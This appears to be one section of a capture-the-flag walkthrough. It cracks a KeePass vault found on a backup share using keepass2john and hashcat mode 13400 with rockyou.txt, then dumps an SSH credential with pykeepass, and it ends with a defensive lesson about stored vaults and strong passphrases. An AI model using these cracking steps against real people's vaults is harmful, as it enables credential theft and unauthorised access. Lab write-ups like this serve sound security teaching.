# 02 — The KeePass vault

A KeePass database is an encrypted XML container. `keepass2john` turns the header into a hash that
`hashcat` mode `13400` understands, and `rockyou.txt` does the rest.

## 2.1 Extract the hash

```bash
keepass2john keys.kdbx > keepass.hash
cat keepass.hash
```

```text
keys:$keepass$*2*6000*0*[redacted]*[redacted]*[redacted]*[redacted]*[redacted]*[redacted]
```

The fields encode the KDBX version, the transformation rounds and the master seed. Nothing here is
useful without the master password, which is the point.

## 2.2 Crack it

```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
```

```text
hashcat (v6.2.6) starting
...
KEEPFILE: Mode 13400 (KeePass 1/2)
...
Recovered........: 1/1 (100.00%) Digests
```

`-m 13400` is the only detail that matters: without it `hashcat` either refuses the hash or runs the
wrong algorithm at a fraction of the speed. KeePass is deliberately slow to guess, which is why the
recovered password is a predictable one rather than a random string.

```bash
hashcat -m 13400 keepass.hash --show
```

```text
keys.kdbx:[redacted]
```

## 2.3 Read the vault

KeePass stores entries as title / username / password. `pykeepass` opens the file with the recovered
master password and lists them without a GUI:

```bash
python3 -m pip install pykeepass
python3 -c 'from pykeepass import PyKeePass; \
kp = PyKeePass("keys.kdbx", password="[redacted]"); \
[print(e.title, "|", e.username, "|", e.password) for e in kp.entries]'
```

```text
SSH | matt | [redacted]
```

One entry, and it is the one that matters: a username and a password for SSH.

## 2.4 Why this works, and when it will not

| Condition | Effect |
|---|---|
| a predictable master password | `rockyou.txt` recovers it in minutes |
| KeePass 2 with default rounds | slow per guess, but a dictionary word still falls |
| a long passphrase master password | this path ends here; the vault is not the way in |

The lesson is not "crack KeePass" — it is **a backup share is a credential store**. A vault copied
into `Backup` turns nine folders of empty PDFs into one credential, and the rest of the box follows
from it.

---

**Next:** [`03-foothold.md`](03-foothold.md)
